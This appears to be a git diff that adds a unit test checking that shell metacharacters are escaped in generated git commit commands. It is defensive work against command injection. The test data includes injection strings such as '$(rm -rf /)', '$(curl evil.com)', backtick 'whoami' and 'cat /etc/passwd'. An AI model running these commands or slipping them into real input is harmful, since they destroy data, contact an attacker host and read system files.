@@ -18,7 +18,7 @@ import {
 } from '../../functions/api/submit/storage.js';
 import { handleIssueSubmission } from '../../functions/api/submit/issue.js';
 import { handlePRSubmission } from '../../functions/api/submit/pr.js';
-import { EdgeGatewayClient } from '../src/engine/edge-client.js';
+import { EdgeGatewayClient, escapeShellDoubleQuotes } from '../src/engine/edge-client.js';
 import type {
   KVNamespaceLike,
   R2BucketLike,
@@ -713,6 +713,26 @@ Subject: [PATCH] Fix bounds check
 
       expect(prCmds.pushCommand).toBe('git push origin feat/dag-perf:refs/pull/101/head');
       expect(prCmds.patchFileName).toBe('0001-optimize-dag-traversal.patch');
+    });
+
+    it('safely escapes shell metacharacters in local Git commit commands', () => {
+      const client = new EdgeGatewayClient();
+
+      expect(escapeShellDoubleQuotes('Simple title')).toBe('Simple title');
+      expect(escapeShellDoubleQuotes('Fix $USER issue')).toBe('Fix \\$USER issue');
+      expect(escapeShellDoubleQuotes('Exploit `whoami`')).toBe('Exploit \\`whoami\\`');
+      expect(escapeShellDoubleQuotes('Subshell $(rm -rf /)')).toBe('Subshell \\$(rm -rf /)');
+      expect(escapeShellDoubleQuotes('Quote "injection" & \\slash')).toBe('Quote \\"injection\\" & \\\\slash');
+
+      const dangerousCmds = client.generateLocalIssueCommands({
+        title: 'Fix $(curl evil.com) in $HOME',
+        description: 'Vulnerability with `cat /etc/passwd` and "quotes" and \\backslashes',
+        customId: '102',
+      });
+
+      expect(dangerousCmds.commitHelperCommand).toBe(
+        'git commit --allow-empty -m "Fix \\$(curl evil.com) in \\$HOME" -m "Vulnerability with \\`cat /etc/passwd\\` and \\"quotes\\" and \\\\backslashes" && git push origin HEAD:refs/issues/102'
+      );
     });
 
     it('handles offline fallback: persists draft and generates commands on network failure', async () => {
